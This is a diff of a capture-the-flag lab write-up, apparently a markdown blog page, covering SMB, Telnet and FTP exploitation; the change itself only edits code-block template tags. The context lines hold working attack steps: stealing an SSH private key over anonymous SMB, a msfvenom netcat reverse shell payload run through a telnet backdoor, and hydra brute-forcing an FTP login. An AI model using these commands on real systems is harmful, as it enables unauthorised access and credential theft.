@@ -29,7 +29,7 @@ Use these links as references.
 
 
 Using `nmap`, perform basic recon and get listening ports.
-{% capture code %}{% raw %}nmap -Pn --top 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn --top 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 19:41 IST
 Nmap scan report for <ip>
@@ -41,10 +41,10 @@ PORT    STATE SERVICE      REASON
 139/tcp open  netbios-ssn  syn-ack ttl 63
 445/tcp open  microsoft-ds syn-ack ttl 63
 
-Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 If ports `139` and `445` are open, it can be checked for `smb enumeration`.
-{% capture code %}{% raw %}enum4linux.pl -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}enum4linux.pl -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 29 05:14:19 2021
 
@@ -181,7 +181,7 @@ S-1-22-1-1000 Unix User\cactus (Local User)
 No printers returned.
 
 enum4linux complete on Mon Mar 29 05:15:13 2021
-{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 SMB port `139` is used for internal windows-windows share.
 SMB port `445` is used to access SMB over internet.
@@ -195,14 +195,14 @@ Use these links as references.
 
 
 Use `smbclient`, enumerate and get the flag.
-{% capture code %}{% raw %}smbclient //<ip>/profiles -U Anonymous -p 445{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}smbclient //<ip>/profiles -U Anonymous -p 445{% endraw %}{% endcapture %} {% include code.html code=code%}
 {% capture code %}{% raw %}Enter WORKGROUP\Anonymous's password: <empty>
-Try "help" to get a list of possible commands.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Try "help" to get a list of possible commands.{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Check if there are any interesting files and download that.
 {% capture code %}{% raw %}ls
 get "<file>" smb_enum.txt
-!cat smb_enum.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+!cat smb_enum.txt{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Since the user is allowed ssh to other server, check if there is any remnants of rsa/dsa keys.
 {% capture code %}{% raw %}recurse ON
@@ -211,13 +211,13 @@ mget .ssh
   getting file \.ssh\id_rsa of size 1679 as id_rsa (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
   getting file \.ssh\id_rsa.pub of size 396 as id_rsa.pub (0.6 KiloBytes/sec) (average 1.5 KiloBytes/sec)
   NT_STATUS_ACCESS_DENIED opening remote file \.ssh\authorized_keys
-exit{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+exit{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Try to ssh using the downloaded rsa keys.
 {% capture code %}{% raw %}ssh cactus@<ip>
 ls
 cat smb.txt
-  <flag>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+  <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 
 ## Telnet
@@ -230,7 +230,7 @@ Use these links as references.
 
 
 Using `nmap`, perform basic recon and get listening ports.
-{% capture code %}{% raw %}nmap -Pn --top-ports 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn --top-ports 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-29 05:38 BST
 Nmap scan report for ip-10-10-250-209.eu-west-1.compute.internal (10.10.250.209)
@@ -238,10 +238,10 @@ Host is up, received arp-response (0.0012s latency).
 All 1000 scanned ports on ip-10-10-250-209.eu-west-1.compute.internal (10.10.250.209) are closed because of 1000 resets
 MAC Address: 02:6C:82:A4:FA:3B (Unknown)
 
-Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Since nmap scan doesnt show much in top ports and it gets slower with `-p-` option, it can be broken down to 1000 ports at a time and get the results.
-{% capture code %}{% raw %}nmap -Pn -T4 -sS -p8001-9000 --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn -T4 -sS -p8001-9000 --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 22:19 IST
@@ -252,10 +252,10 @@ Reason: 999 resets
 PORT     STATE    SERVICE       REASON
 8012/tcp open     unknown       syn-ack ttl 63
 
-Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 A detailed analysis on open port will give more information we are looking for.
-{% capture code %}{% raw %}nmap -Pn -p8012 -A --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn -p8012 -A --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 22:20 IST
@@ -278,13 +278,13 @@ HOP RTT       ADDRESS
 2   166.39 ms <ip>
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 166.24 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 166.24 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 
 ### Task 7 - Exploiting Telnet
 
 Now that the port running `telnet` and more info on it is discovered, we can try to access it.
-{% capture code %}{% raw %}telnet <ip> 8012{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}telnet <ip> 8012{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Basic navigation can be done from `telnet` as below.
 {% capture code %}{% raw %}Trying <ip>...
@@ -295,25 +295,25 @@ SKIDY'S BACKDOOR. Type .HELP to view commands
 .HELP: View commands
  .RUN <command>: Execute commands
 .EXIT: Exit
-.RUN ls{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+.RUN ls{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Start a tcpdump listener locally in another session.
-{% capture code %}{% raw %}tcpdump ip proto \\icmp -i <tun0|eth0>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}tcpdump ip proto \\icmp -i <tun0|eth0>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 In the telnet session, try to ping local ip to see if connection can be established and commands can be executed.
-{% capture code %}{% raw %}.RUN ping -c1 <local-ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}.RUN ping -c1 <local-ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 The ping packets can be seen in tcpdump listener session.
 An output similar to below will be obtained.
 {% capture code %}{% raw %}23:16:09.761762 IP <ip> > <hostname>: ICMP echo request, id 1017, seq 1, length 64
-23:16:09.761827 IP <hostname> > <ip>: ICMP echo reply, id 1017, seq 1, length 64{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+23:16:09.761827 IP <hostname> > <ip>: ICMP echo reply, id 1017, seq 1, length 64{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 A reverse shell payload can be generated using msfvenom and can be exploited from listening netcat session.
-{% capture code %}{% raw %}msfvenom -p cmd/unix/reverse_netcat lhost=<local-ip> lport=4444 R{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}msfvenom -p cmd/unix/reverse_netcat lhost=<local-ip> lport=4444 R{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 The basic options used in msfvenom.
 - `-p` - payload
@@ -326,22 +326,22 @@ An output similar to below will be obtained.
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 89 bytes
-mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn | /bin/sh >/tmp/gqbn 2>&1 ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn | /bin/sh >/tmp/gqbn 2>&1 ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Use `netcat` to listen for reverse proxy connection in separate session.
-{% capture code %}{% raw %}nc -lvp 4444{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nc -lvp 4444{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 From the `telnet` session, initiate the reverse payload generated from `msfvenom`.
-{% capture code %}{% raw %}.RUN mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn 2>&1 | /bin/sh >/tmp/gqbn ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}.RUN mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn 2>&1 | /bin/sh >/tmp/gqbn ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained in telnet listener session.
 {% capture code %}{% raw %}listening on [any] 4444 ...
 <ip>: inverse host lookup failed: Unknown host
-connect to [<local-ip>] from (UNKNOWN) [<ip>] 51102{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+connect to [<local-ip>] from (UNKNOWN) [<ip>] 51102{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Capture the flag.
 {% capture code %}{% raw %}cat flag.txt
-  <flag>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+  <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 
 ## FTP
@@ -364,7 +364,7 @@ Use these links as references.
 
 
 Using `nmap`, perform basic recon and get listening ports.
-{% capture code %}{% raw %}nmap -Pn -T4 -p 1-1000 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn -T4 -p 1-1000 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-03 00:32 IST
@@ -376,10 +376,10 @@ PORT   STATE SERVICE REASON
 21/tcp open  ftp     syn-ack ttl 63
 80/tcp open  http    syn-ack ttl 63
 
-Nmap done: 1 IP address (1 host up) scanned in 6.09 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 6.09 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Perform a detailed scan on FTP port to get more info.
-{% capture code %}{% raw %}nmap -Pn -T4 -p21 -A -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}nmap -Pn -T4 -p21 -A -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-03 00:33 IST
@@ -415,10 +415,10 @@ HOP RTT       ADDRESS
 2   189.35 ms <ip>
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 We can see anonymous login is enabled and the file which can be retrieved using the same.
-{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Connected to <ip>.
@@ -428,7 +428,7 @@ Name (<ip>:<user>): anonymous
 Password:
 230 Login successful.
 Remote system type is UNIX.
-Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Get the contents of file `PUBLIC_NOTICE.txt` to check if any useful information is available.
 {% capture code %}{% raw %}ftp> pwd
@@ -444,7 +444,7 @@ ftp> get "PUBLIC_NOTICE.txt"
   150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
   226 Transfer complete.
   353 bytes received in 0.00 secs (137.7254 kB/s)
-ftp> !cat PUBLIC_NOTICE.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+ftp> !cat PUBLIC_NOTICE.txt{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 
 ### Task 10 - Exploiting FTP
@@ -457,7 +457,7 @@ Use these links as references.
 
 
 Use `hydra` to exploit ftp.
-{% capture code %}{% raw %}hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Hydra v9.2-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal  purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -473,10 +473,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-03 00:56:
 [21][ftp] host: <ip>   login: mike   password: password
 [STATUS] attack finished for <ip> (waiting for children to complete tests)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-03 00:56:22{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-03 00:56:22{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Since the password is exploited, we can try with `ftp` using the password.
-{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Connected to <ip>.
@@ -486,7 +486,7 @@ Name (<ip>:lab): mike
 Password: password
 230 Login successful.
 Remote system type is UNIX.
-Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 Capture the flag.
 {% capture code %}{% raw %}ftp> ls
@@ -501,7 +501,7 @@ ftp> get ftp.txt
   150 Opening BINARY mode data connection for ftp.txt (26 bytes).
   226 Transfer complete.
   26 bytes received in 0.00 secs (39.5493 kB/s)
-ftp> !cat ftp.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
+ftp> !cat ftp.txt{% endraw %}{% endcapture %} {% include code.html code=code%}
 
 
 ### Task 10 - Expanding knowledge
